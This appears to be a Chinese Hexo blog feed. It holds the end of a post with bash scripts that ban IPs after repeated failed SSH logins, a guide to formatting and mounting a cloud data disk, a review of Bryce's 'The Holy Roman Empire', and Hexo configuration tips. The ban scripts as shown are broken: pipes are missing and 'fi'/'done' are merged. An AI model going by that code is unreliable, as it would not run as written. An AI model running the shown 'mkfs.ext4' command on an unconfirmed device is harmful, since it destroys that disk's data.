class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">方法1：通过lastb获取登录状态:</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">DATE=$(date +&quot;%a %b %e %H:%M&quot;) #星期月天时分  %e单数字时显示7，而%d显示07</span><br><span class="line">ABNORMAL_IP=$(lastb grep &quot;$DATE&quot; awk &#x27;&#123;a[$3]++&#125;END&#123;for(i in a)if(a[i]&gt;10)print i&#125;&#x27;)for IP in $ABNORMAL_IP; do</span><br><span class="line">    if [ $(iptables -vnL grep -c &quot;$IP&quot;) -eq 0 ]; then</span><br><span class="line">        iptables -I INPUT -s $IP -j DROP    fidone</span><br><span class="line">        </span><br><span class="line">方法2：通过日志获取登录状态</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">DATE=$(date +&quot;%b %d %H&quot;)</span><br><span class="line">ABNORMAL_IP=&quot;$(tail -n10000 /var/log/auth.log grep &quot;$DATE&quot; awk &#x27;/Failed/&#123;a[$(NF-3)]++&#125;END&#123;for(i in a)if(a[i]&gt;5)print i&#125;&#x27;)&quot;</span><br><span class="line">for IP in $ABNORMAL_IP; do</span><br><span class="line">    if [ $(iptables -vnL grep -c &quot;$IP&quot;) -eq 0 ]; then</span><br><span class="line">        iptables -A INPUT -s $IP -j DROP        </span><br><span class="line">        echo &quot;$(date +&quot;%F %T&quot;) - iptables -A INPUT -s $IP -j DROP&quot; &gt;&gt;~/ssh-login-limit.log    </span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云轻量服务器挂载数据盘</title>
      <link href="/137.html"/>
      <url>/137.html</url>
      
        <content type="html"><![CDATA[<p>前段时间新购入数据盘，发现一直没用到，因此通过参考<del>网络攻略</del>（百度），了解如何挂载数据盘，操作也极其简单</p><h2 id="1、查看数据盘挂载情况，可以看到并无数据盘"><a href="#1、查看数据盘挂载情况，可以看到并无数据盘" class="headerlink" title="1、查看数据盘挂载情况，可以看到并无数据盘"></a>1、查看数据盘挂载情况，可以看到并无数据盘</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/uploads/202203/23/g1.jpg" alt="1" title="1"></p><h2 id="2、查看磁盘分区"><a href="#2、查看磁盘分区" class="headerlink" title="2、查看磁盘分区"></a>2、查看磁盘分区</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/uploads/202203/23/g2.jpg" alt="2" title="2"></p><p>对比Disk &#x2F;dev&#x2F;vda，vda下面有一个Device &#x2F;dev&#x2F;vda1，vdb少了一个Device。</p><p>很明显，说明数据盘是有的，只不过现在没有分区，还无法使用，所以接下来我们就要对它进行分区了。</p><h2 id="3、格式化分区"><a href="#3、格式化分区" class="headerlink" title="3、格式化分区"></a>3、格式化分区</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/vdb</span><br></pre></td></tr></table></figure><h2 id="4、添加分区信息和自动挂载"><a href="#4、添加分区信息和自动挂载" class="headerlink" title="4、添加分区信息和自动挂载"></a>4、添加分区信息和自动挂载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;/dev/vdb   /mnt ext4    barrier=0  0  0&#x27; &gt;&gt; /etc/fstab</span><br><span class="line">cat /etc/fstab #查看是否写入成功</span><br></pre></td></tr></table></figure><p>把数据盘挂载到&#x2F;mnt文件夹下，也就是说，&#x2F;mnt文件夹下的文件都会储存在数据盘中。</p><h2 id="5、挂载"><a href="#5、挂载" class="headerlink" title="5、挂载"></a>5、挂载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -a</span><br><span class="line">df -h #在查看就可以看到挂载成功</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/uploads/202203/23/g4.png" alt="3" title="3"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 数据盘 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书评|《神圣罗马帝国》詹姆斯·布赖斯[著]</title>
      <link href="/69.html"/>
      <url>/69.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>像神圣罗马帝国这样一个伟大的历史结构，是不能用一元论来加以解释的，而应当作为由许多局部组成的一个整体来仔细研究。<br>神圣罗马帝国的名称是经过几个世纪逐步形成的。<br>八、九世纪以来，一种所谓“世界宗教与世界帝国”的理论逐渐形成，它以中世纪的唯心主义和形而上学为基础，以基督教义为依据，由教会杜撰而来。这一理论认为基督教和罗马帝国都具有世界性，两者是重合的。罗马教皇作为上帝的代理人，管理下界世人的灵魂，皇帝作为上帝的代理人，管理尘世事务，而其主要职责是保卫教会。————引自章节：1904年版前言</p><p>18个世纪过去了，这个帝国在疆域、权力、性质上经历了极大的变化，却把一个早已失去了原有意义的称号和虚荣几乎没有改变的保存了下来。<br>严格说来，神圣罗马帝国开端的日子应当从公元800年法兰克国王由教皇利奥三世加冕为罗马皇帝时算起。但在历史上没有一件事情是孤立的。<br>神圣罗马帝国本身只不过是一种传统、一种逝去的荣光的奇异复活。因此，为了弄清楚究竟哪些因素形成了帝国的制度。我们必须仔细考察基督教会的古代制度；观察罗马整体；追溯犹太的神圣政体；观察三四世纪罗马帝国的情况；古老帝国的专制主义体制；了解罗马人和基督教创造的世俗组织和宗教组织对于蛮族的影响。————引自 第1章 绪论</p><p>2世纪的罗马帝国。皇帝成为罗马世界的政治权力和行动的唯一中心和源泉。<br>民族界限的消失。一切民族的界限逐渐融合于共同帝国的观念之中。卡拉卡拉皇帝把罗马公民权扩大到罗马世界所有的本地人，产生了很好的结果，完成了商业、文学以及对宗教信仰的宽容。<br>世界的罗马。戴克里先承认，微弱的帝国心脏已经不能再使身体的最末梢感觉到它的跳动。于是，他把最高统治权分配给四个王。<br>罗马帝国的观念不会由于罗马城的灾难而受到影响，东西罗马帝国分裂，西罗马帝国迁都米兰和拉文纳，都没有损害罗马城的威信，也没有损害臣民共有同一个帝国的观念。叙利亚人、潘诺尼亚人、不列颠人、西班牙人等，都仍然自称为罗马人。<br>基督教的力量出现。教会制度，在教义上和组织上都要求一种更为严格的一致性，使通过参加共同的圣礼而联合起来的信徒团体这一概念更加有生气，保持并重新发扬光大了全世界单一罗马民族情感。基督教和文明变得和罗马帝国同疆共域了，一个罗马人即是一个基督徒，不久后就变成：一个基督徒须是一个罗马人。————引自 第2章 蛮族入侵前的罗马帝国</p></blockquote><p>在阿尔卑斯山以北，日耳曼人耿直而朴实，坚韧而铁血；在山麓以南，继承了罗马遗产的意大利人则富有艺术品味，好奢华享乐而又狡狯多变、反复无常，善于在政治舞台上翻云覆雨。德意志神圣罗马帝国的历史，便是条顿与罗马这两个民族在争斗中互相拥抱的历史，逐渐将彼此的血脉融为一体。</p><p>也许德国人从一开始就不应该和意大利人搅在一起，日耳曼的国王们根本不应该受到复兴罗马帝国的诱惑，为意大利那四分五裂的局面买单；当他们一次又一次率领祖祖辈辈苦心经营的军队翻过阿尔卑斯山，为了换取那顶名存实亡的罗马帝国的冠冕，与历代玩弄权术的教皇、与那些本为条顿人但早已沾染了意大利人反复无常气息的伦巴第小领主们，与时时刻刻侵扰海岸线的撒拉逊人，与掌握地中海商业命脉而左右逢源的城市僭主们，与早先侵入南部的诺曼强盗骑士们，与臣属东罗马的西西里贵族们斗智斗勇的时候，他们最终的结局似乎已经注定——一种仿佛永无止境的斗争在历代君主身上重演，他们努力挽留已经不存在的欧洲统一帝国的坚持，固然没有结果，但却为近代带来了光彩与荣耀。</p><p>条顿民族不断挑战宗教权威的传统终于在中世纪末年化作宗教改革的热忱，震撼了整个欧洲。德意志为北部意大利注入秩序的力量，而意大利丰富多彩的文明也升华了蛮族文化。</p><p>詹姆斯·布赖斯的著作并不叙述神圣罗马帝国的一般发展历程，而是试图从法理的高度阐述神圣罗马帝国的历史源流，以及在宗教和世俗权力方面的合法性，由此论证中世纪帝国构成的一般性理论。从帝国五世纪的戏剧性历史可以见到如下特征：</p><h2 id="位于欧洲权力漩涡中心的罗马教廷"><a href="#位于欧洲权力漩涡中心的罗马教廷" class="headerlink" title="位于欧洲权力漩涡中心的罗马教廷"></a>位于欧洲权力漩涡中心的罗马教廷</h2><p>教廷的权力名义上来自上帝，但实际需要相当的世俗力量支持。历代教皇中最具有政治智慧者向来不乏合纵连横的才能，他们求助于法兰克国王是因为要抑制伦巴第领主们，以保持在意大利的至上权力；当德意志的皇帝们过于强大而无法掌控时，他们又转而拉拢伦巴第领主挑战皇帝的权威；在中世纪早期，对于拜占庭那遥远的势力，他们虽然在宗教上与之不睦，但却又遥尊东方帝国的威权，是为了不让意大利本土的任何势力篡位而上；他们有时也会召来南部的诺曼强盗骑士的援助，如果德意志和北意都无法仰赖的话；当西欧内部的矛盾不可调和之时，他们便策划十字军东征运动，使西欧团结在宗教的旗帜下，而让东方世界成为众矢之的。</p><p>总之，教皇们左右逢源，以罗马人累世积攒的政治智慧，试图凌驾于所有世俗权力之上，使自己成为中世纪西欧实际上的最高君主。</p><h2 id="不断征战的德意志皇帝"><a href="#不断征战的德意志皇帝" class="headerlink" title="不断征战的德意志皇帝"></a>不断征战的德意志皇帝</h2><p>自查理曼被加冕为罗马帝国皇帝一来，每一代法兰克&#x2F;德意志国王都怀抱着重新掌握欧洲统一帝国的梦想，但为实现这一夙愿，他们就不得不一次次跨越阿尔卑斯山的蒂罗尔峡口进入意大利，与北意的领主们反复交战，与教皇勾心斗角，与东罗马或者南意领主联姻以获得更为正统的地位；而回到自己国内，又不得不努力积累数代人的力量以应付征服意大利的财力和人力之需。</p><p>德意志国王在意大利的权力并不稳固，主要依靠武力来保障，一旦他们的军队撤走，意大利又会故态复萌。同时，皇帝们还必须平息国内同样不驯服的德意志诸侯的纷争，时不时征讨北欧和东欧的蛮族使之臣服。两头的奔忙却不免故此失彼，到十三世纪左右，英法两国已经聚集两三百年的努力，逐渐成为两个欧洲强国，而德意志国王们的权力却不断收缩，最后沦为选帝侯们操纵的傀儡。</p><h2 id="教权与俗权的斗争无所不在"><a href="#教权与俗权的斗争无所不在" class="headerlink" title="教权与俗权的斗争无所不在"></a>教权与俗权的斗争无所不在</h2><p>不但神圣罗马帝国皇帝和教皇的斗争贯穿始终，即使在意大利本土，亦存在各个等级的教俗之争。北意的领主有时也为了争夺封土和财富，反对他们的大主教；甚至在罗马城之内，世俗贵族也时常反对教皇，试图重新建立罗马的共和政体；在德意志国内，皇帝与他的主教诸侯们常常出现龃龉。或者不如说这是中世纪欧洲的最鲜明特征，在英国和法国，君主与大主教们的斗争同样精彩纷呈。所有这些斗争一次次挑战着名不副实、大多时候并无宗教纯洁可言的罗马教廷，不断促进教廷的改革，最终点燃了宗教改革的火焰。</p><h2 id="新兴城市与传统封建特权的矛盾"><a href="#新兴城市与传统封建特权的矛盾" class="headerlink" title="新兴城市与传统封建特权的矛盾"></a>新兴城市与传统封建特权的矛盾</h2><p>无论是在意大利和德意志，崛起的新兴城市逐渐掌握了大量财富。意大利沿岸各城市共和国是地中海沿岸与东方通商的必经之路，占据得天独厚的地理条件，此类城市包括威尼斯、热那亚、比萨以及阿马非。米兰是陆上商业往来的最重要城市，占据通向阿尔卑斯山北麓伯伦纳山口，中古时期唯一可通马车的山路，是通往山麓以北的最佳路径，德国皇帝们144次越过阿尔卑斯山，有66次是取道勃伦纳山路。从13世纪起，德国比意大利拥有更多自由城市，这些城市里居住着顽强的自由市民。在中世纪的封建领主不断交战的乱世中，自由城邦成为对抗封建主和教士的一股实力；有时，皇帝为了与选侯们相斗争，甚至会依仗这些城邦的力量。</p><h2 id="中世纪政治实体的碎片化"><a href="#中世纪政治实体的碎片化" class="headerlink" title="中世纪政治实体的碎片化"></a>中世纪政治实体的碎片化</h2><p>在封建欧洲，政治实体在封君与封臣复杂体系中纷繁而多变，小公国和各种伯爵国林立，又不断互相交战吞并。意大利大致上可分为五种势力：1.北意（伦巴第）的领主，本身也是条顿蛮族，早先进入意大利并占据波河平原和托斯卡纳，分裂成数个小公国。2.中部的教皇国，包括罗马并横贯中部意大利，领土依据各时期教皇的能力或大或小，干涉或掌控欧洲各国权力。3.东罗马仍然领有两西西里，使南意保持更古老纯粹的罗马帝国风貌；在11世纪进入南部意大利的诺曼底人也曾建立一个融合诺曼、西西里甚至穆斯林文化的南部王国。4.意大利沿岸各城市商业共和国，由于掌握地中海经济命脉，富有而独立，由僭主政治所统治。5.同时早期有萨拉逊人、匈牙利人不断入侵，后期法国和西班牙的势力也开始影响意大利。</p><p>神圣罗马帝国本身的历史演化头绪繁多，下面扼要整理重要的君主与事迹：</p><h2 id="加洛林朝从野蛮的中世纪丛林中脱颖而出，以强大的力量进行重建罗马帝国的努力。"><a href="#加洛林朝从野蛮的中世纪丛林中脱颖而出，以强大的力量进行重建罗马帝国的努力。" class="headerlink" title="加洛林朝从野蛮的中世纪丛林中脱颖而出，以强大的力量进行重建罗马帝国的努力。"></a>加洛林朝从野蛮的中世纪丛林中脱颖而出，以强大的力量进行重建罗马帝国的努力。</h2><p>也许罗马帝国的光芒实在是太过灿烂了，“自从西罗马帝国最后一个恺撒把自己的权力交于元老院手中，已经过去了三百二十四年。罗马帝国作为世界秩序的一个必要组成部分的观念则没有消亡——亲手摧毁了它的条顿国王们也承认它，教廷珍念它，人们从法律和习俗中想起它，它对整个欧洲来说弥足珍贵。”</p><p>查理曼应时而生。自从他的祖父查理·马特作为宫相从默洛温朝的基业中攫取了权力、为这一家族奠定了基础以来，这个能干而善于管理资产的家族便日益壮大。8世纪，当罗马教廷与君士坦丁堡产生裂痕，而伦巴第国王们时而支持教皇、时而支持拜占庭皇帝时，教皇便开始仰赖这座当时最强大的靠山——丕平的儿子查理曼最终打败了伦巴底人。</p><p>当查理曼再度从阿尔卑斯山南下，一切便顺利成章地达成——800年，在加冕典礼上，查理脱去朴素的法兰克服装，换上罗马贵人的皮带鞋和短外套，跪在高祭坛旁；教皇诵读福音书毕，在众目睽睽下将凯撒的王冠加于蛮族酋长的额上，人们响起如雷的呼声：这呼声宣告了罗马人和条顿人的联合，南方古老文明与北方新生力量的联合。罗马又成为世界的中心了。</p><p>帝国的血脉显示出罗马和条顿混合的特征：“查理只有在文化和政府设计方面是罗马人，在其他方面是一个日耳曼人，更愿意住在亚琛，他的军队是法兰克人。</p><p>然而，查理死后，他的儿子虔诚者路易性格太过温和，不能约束不安分的贵族，又过分虔诚而受制于教廷，他治下的帝国很快变乱丛生: 伦巴第、阿基坦、奥斯特拉西亚和巴伐利亚均自立为国。</p><p>路易死后，儿子们立即诉诸武力，843年依照条顿原则：诸子平分领土 ，这战胜了领土不可分割的罗马原则，《凡尔登条约》将帝国一分为三：秃头查理拥有西法兰克(逐渐演变成法兰西)，口吃者路易拥有东法兰克（基本奠定德意志的疆界），长子罗退尔作为名义上的皇帝拥有中法兰克——从北海至地中海的狭长国土，但它很快也散失于东西两个王国之中。意大利更是在风雨飘摇中独立了六十年，中部和北部被各种诺曼人的小领主趁机占有。</p><p>888年，最终加洛林帝国终结在胖子查理的手中，查理大帝所遏制的蛮族的洪流再次从四面八方涌入帝国。帝国的第一个朝代在此终结。</p><h2 id="在萨克森朝，我们将目睹每一代皇帝与罗马教廷之间形态各异的斗争。"><a href="#在萨克森朝，我们将目睹每一代皇帝与罗马教廷之间形态各异的斗争。" class="headerlink" title="在萨克森朝，我们将目睹每一代皇帝与罗马教廷之间形态各异的斗争。"></a>在萨克森朝，我们将目睹每一代皇帝与罗马教廷之间形态各异的斗争。</h2><p>（萨克森朝后期出现女系的继承人，属法兰克尼亚家族，为便于概括，合并在萨克森朝）</p><p>奥托（一世）大帝是西方帝国的第二位创立者，他为帝国加上了“神圣”二字。他的领土比加洛林朝远为缩小，但却更为稳固。意大利的混乱局面再次召唤着德意志的国王: 勃艮第分裂为两块，意大利则被弗留利的贝伦加尔和斯波莱托的格威多所瓜分。教皇以帝冕为玩具，为了借助这些领主的武力，先后将斯波莱托、伦巴第和勃艮第的领主加冕为帝，这些仿佛用纸做的皇冠丝毫没有带来实际的权力。</p><p>此时的意大利风纪败坏，与奥托大帝针锋相对的教皇-约翰十二世年仅25岁，是个出身贵族出身、骄奢淫逸的阔少。奥托进入意大利的缘由具有相当的骑士浪漫色彩：勃艮第前领主罗退尔的寡妻阿黛尔海德，被北意领主贝伦加尔俘虏。王后向德意志国王奥托求助，而奥托是骑士美德的典型；于是，951年，奥托第一次进入意大利，救了受害的王后并与其结婚，迫使贝伦加尔臣服。</p><p>但贝伦加尔毫无信义再次反叛，教皇再次求助于奥托。在奥托加冕之后规定，其后的教皇选举将获得皇帝认可。年轻的教皇忽然发现此时仿佛作茧自缚，于是促使马扎尔人侵袭德意志。奥托于是率领大军进入罗马，约翰十二世逃走并被废。</p><p>奥托一世最终使帝国获得了德意志和2&#x2F;3意大利的领土。</p><p>亨利二世作为捕鸟者的亨利的曾孙而当选为德意志王。但这只在阿尔卑斯山以北得到认可。北意的各领主则推举伊夫雷亚侯爵阿尔多因成为伦巴底国王，因为他软弱好控制。不久又反复无常而推翻阿尔多因。其中一个党派召请亨利二世进入意大利，后者带领庞大的军队，在罗马加冕。然而，军队带来的权力并没有根基，军队走后北意又恢复如初，甚至不比法兰西对帝国更具依附性。</p><p>在这个时期拜占庭在南意的势力衰落，诺曼人罗贝尔·维斯卡尔（1059-1077）建立阿普利亚王国。意大利北方诸城在德意志皇帝离开和诸侯混争之际趁机兴起，米兰、帕维亚和克雷莫纳凭借贸易特许而获得自治。</p><p>亨利三世时期，帝国达到了鼎盛。其时意大利有三个候选人竞逐教皇之位，且都有买卖升职的不名誉之嫌，亨利三世进入意大利，干脆将这三人全部废黜了，并按照自己的意愿任命一个德意志人担任新的教皇。</p><p>原先由皇帝提名的条顿族教皇所发起的改革延续至11世纪，在伟大的教皇希尔德布兰德（格利高里七世）领导下接近完成，这样，教廷的权力便足以挑战皇权了。改革的重要内容是允许教士对封地的独立权力，这样一来德意志有一半封地掌握在主教们手中，不归国王控制而归于教皇了。</p><p>格利高里和亨利四世本来便互不信任，教皇要传皇帝来罗马受审，而皇帝宣布废黜教皇。于是亨利四世被开除教籍。亨利迫于国内外的形势，于卡诺萨城堡（实际是教皇的情妇玛蒂尔达女伯爵的驻地）向教皇忏悔。但他很快发现悔罪并无好处，便立刻扶植一个伪教皇，并终其一生坚持与教皇斗争。</p><p>亨利四世于晚年被废黜，教皇扶植他的儿子亨利五世即位，但后者对教会的斗争甚至更甚于其父。当他在罗马加冕时，由于权力的要求未被认可，他直接拘禁了教皇和红衣主教们，逼迫他们同意自己的条款。直到《沃尔姆斯政教协定》，双方才达成一个名义上的妥协，但皇帝的权力再也不能回复到亨利三世的地位了。</p><h2 id="在霍亨斯陶芬朝，帝国先是焕发出灿烂夺目的光彩，不久便随着历史洪流的骤变忽然黯淡下去，逐渐使其自身成为一件不具有实际意义的古董。它与教廷之间仍然不断纷争的余烬持续燃烧着，直到13世纪这个变革的时代来临，封建制走向末路，资本主义的脚步逐渐来临。"><a href="#在霍亨斯陶芬朝，帝国先是焕发出灿烂夺目的光彩，不久便随着历史洪流的骤变忽然黯淡下去，逐渐使其自身成为一件不具有实际意义的古董。它与教廷之间仍然不断纷争的余烬持续燃烧着，直到13世纪这个变革的时代来临，封建制走向末路，资本主义的脚步逐渐来临。" class="headerlink" title="在霍亨斯陶芬朝，帝国先是焕发出灿烂夺目的光彩，不久便随着历史洪流的骤变忽然黯淡下去，逐渐使其自身成为一件不具有实际意义的古董。它与教廷之间仍然不断纷争的余烬持续燃烧着，直到13世纪这个变革的时代来临，封建制走向末路，资本主义的脚步逐渐来临。"></a>在霍亨斯陶芬朝，帝国先是焕发出灿烂夺目的光彩，不久便随着历史洪流的骤变忽然黯淡下去，逐渐使其自身成为一件不具有实际意义的古董。它与教廷之间仍然不断纷争的余烬持续燃烧着，直到13世纪这个变革的时代来临，封建制走向末路，资本主义的脚步逐渐来临。</h2><p>腓特烈一世</p><p>绰号“红胡子”的腓特烈一世的统治，是帝国最光辉的一页，帝国在这个被视为民族英雄的君主统治下生机勃勃。他将试图征服两个最大的敌人：意大利城市的独立精神和教廷。</p><p>他与教廷的斗争与之前数代相似而更激烈: 封建主赠予教皇领地，皇帝不许；认为皇帝职务是上帝直接赐予的；拒绝为教皇扶马镫；召集贝桑松帝国会议，与教皇使者冲突，就此开始了与教皇亚历山大三世长达二十年的斗争，企图恢复他指挥教士权力的努力；对罗马法&#x2F;罗马制度的掀起一番再研究，并从中找到适用于条顿君主的律条。</p><p>腓特烈在意大利面对许多纷争：伦巴底诸城联盟凭借财富战胜了日耳曼军队。皇帝在意大利的事实权力是断断续续的，全靠军队支持。平定米兰和托尔托纳的叛乱，这是自由文明与君主权力的冲突；伦巴底诸城贵族形成教皇党以反对帝党，城市要求自治；在克雷莫纳的协助下，伦巴底同盟战胜了腓特烈。此时，腓特烈十分有骑士风度地欣然接受了《康斯坦茨合约》，从此只在名义上是伦巴底同盟的君主。</p><p>在自己国内，腓特烈诸事顺遂。他领有400座城堡，联合萨克森与施瓦本，平息阿尔卑斯山以北的教皇党与皇帝党的纠纷。十字军东征时，在一次渡河时（一说洗澡时）死去，成为中世纪性格最高贵的典范。</p><p>腓特烈大帝之后的诸位皇帝则继续与教皇展开不竭的斗争:</p><p>腓特烈之子亨利六世进行了短暂而严酷的统治之后去世。此时接任的教皇英诺森三世是中世纪最有作为的教皇之一，先是开除了不顺服的奥托四世（1201-1212）的教籍，随后扶持腓特烈二世即位，后期又与腓特烈二世反目。</p><p>霍亨斯陶芬朝的末代皇帝——半是诺曼人、半是西西里人（母亲）的腓特烈二世（1212-1250）兼具浪漫的性格，迷人的外表和残暴的个性，这注定了他悲剧的命运。他少年时热衷十字军的激情，后半生热心于迫害异端，自己却被指控为渎神者。他为了领土与教廷进行曲折的斗争，被三次开除教籍。</p><p>腓特烈二世之子康拉德四世被教皇英诺森开除教籍后依然进入意大利，在那里坚持对诸城及教皇军队的战争，同时荷兰的威廉在北、中德意志得到普遍认可。</p><p>在这个理智昏乱的时代，教廷要控制世俗权力，皇帝要行使教权。霍亨斯陶芬家族便就此终结。</p><p>荷兰的威廉死后，德国出现空位期。康沃尔伯爵理查(英国国王亨利三世的兄弟)及卡斯蒂利亚王阿尔丰索十世竟被不同的选帝侯双双选为皇帝——后者只在托莱多研究星相学，并不给自己增添麻烦。德意志陷入无政府状态，莱茵同盟实行互保。1273年，哈布斯堡的鲁道夫既得到了教皇的认可，也被七选侯选为皇帝——并不是由于他强大，而恰恰是由于他的实力弱小，七选侯认为他不至于侵犯他们各自的势力。从此，帝国名存实亡，但在名义上继续存在了600年，直到它成为一件可笑的古董。</p><p>此时德法的势力对比与两百年之前恰好相反：鲁道夫弱于腓力三世，正如亨利三世比腓力一世强一样。英国的君权也加强了。德意志的皇帝们由于精力过于分散而不能专心建设自己的领土。到13世纪末，欧洲旧的封建政治文化已趋崩解，社会格局剧烈变化，它就要在动荡的乱世之后，重构自身，进入新的王国。</p><p>想看原著的 请点击 <a href="https://cos.gjcloak.xyz/uploads/202203/20/%E7%A5%9E%E5%9C%A3%E7%BD%97%E9%A9%AC%E5%B8%9D%E5%9B%BD%5B%E8%8B%B1%5D%E8%A9%B9%E5%A7%86%E6%96%AF%C2%B7%E5%B8%83%E8%B5%96%E6%96%AF%28%E8%91%97%29.%E5%AD%99%E7%A7%89%E8%8E%B9%E3%80%81%E8%B0%A2%E5%BE%B7%E9%A3%8E%E3%80%81%E8%B5%B5%E4%B8%96%E7%91%9C%28%E8%AF%91%29.%E5%95%86%E5%8A%A1%E5%8D%B0%E4%B9%A6%E9%A6%86%281998%29.pdf">这里</a> 下载</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐 </tag>
            
            <tag> 神圣罗马帝国 </tag>
            
            <tag> 詹姆斯·布赖斯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次搭建hexo博客（二）配置与注意事项</title>
      <link href="/68.html"/>
      <url>/68.html</url>
      
        <content type="html"><![CDATA[<h2 id="config-yml文件"><a href="#config-yml文件" class="headerlink" title="_config.yml文件"></a>_config.yml文件</h2><p>进入宝塔，hexo博客文件夹（看你文件夹安装在哪），通过文件找到你的博客文件夹，打开_config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title    网站标题</span><br><span class="line">subtitle    网站副标题</span><br><span class="line">description    网站描述，主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词</span><br><span class="line">keywords    网站的关键词。支持多个关键词。</span><br><span class="line">author    您的名字，参数用于主题显示文章的作者。</span><br><span class="line">language    网站使用的语言。对于简体中文用户来说，使用不同的主题可能需要设置成不同的值，请参考你的主题的文档自行设置，常见的有 zh-Hans和 zh-CN。</span><br><span class="line">timezone    网站时区。Hexo 默认使用您电脑的时区。请参考 时区列表 进行设置，如 America/New_York, Japan, 和 UTC 。一般的，对于中国大陆地区可以使用 Asia/Shanghai。</span><br><span class="line">theme 变更主题只需要在这里填写主题名称，主题文件需放入themes文件夹下</span><br></pre></td></tr></table></figure><p>这是部分信息，还有些信息可以通过 <a href="https://hexo.io/zh-cn/docs/">hexo中文文档</a> 来查阅</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效<br>解决办法：执行clean语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo clean</span><br></pre></td></tr></table></figure><p>2、执行命令hexo server，提示：Usage: hexo …. 提示找不到该指令<br>解决办法：在Hexo 3.0 后server被单独出来了，需要安装server，安装的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-server –save</span><br></pre></td></tr></table></figure><p>安装此server后再试，问题解决</p><p>3、localhost:4000 端口被占用，可执行 hexo s -p 5000 修改成5000 端口</p><p>4、YAMLException: incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line at line 1, column 33:<br>解决方案：<br>（1）出现这种情况，一般都是缺少空格，在:冒号之后要有空格！检查x行y列附近的冒号，其之后是否跟了空格。<br>（2）仔细检查_config.yml文件中所有冒号后面的空格，格式很严格，必须是只有一个，半角。不管是多了还是少了都会报错，这是yml解释器所定义的语法。如果不确定的话，将输入法调整到英文模式，删除所有冒号后面的空格重新输入，不要使用Tab。</p><p>5、ValidationError: ‘null’ is not a string!<br>解决方案： 一般都是因为文章无内容，可能是因为在这篇博客文章中，有某些属性没有填写，比如author属性，tag属性，categories属性等，导致该属性是空的，即null，所以报错。<br>友情提示：如果你是用MarkdownPad 2来进行博文写作，可能在打开该md文件之后，对文件名进行了修改，导致出现了两篇文章。就会出现错误。</p><p>6、执行hexo g命令后，报错：incomplete explicit mapping pair; a key node is missed<br>解决方案：<br>主题目录下所有yml文件中所有有空格的字段都用双引号括起来，尤其注意languages下面的yml文件</p><p>7、在gitee新建仓库时名称最好是保持跟你注册时的个人空间地址是一样的。因为这样就不会生成二级域名了。如果不跟注册时的个人空间地址一样的话，到时候自己的网站就会有二级域名的存在了</p><p>8、提交gitee。<br>安装 hexo-deployer-git。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>需要先生成本地密钥，再把密钥配置到gitee上个人设置里的SSH公钥里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建密钥</span><br><span class="line">ssh-keygen -t rsa -C “你的邮箱”</span><br><span class="line">查看密钥</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>再_config.yml文件的deploy处配置，repo为仓库的ssh地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; </span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>最后通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo 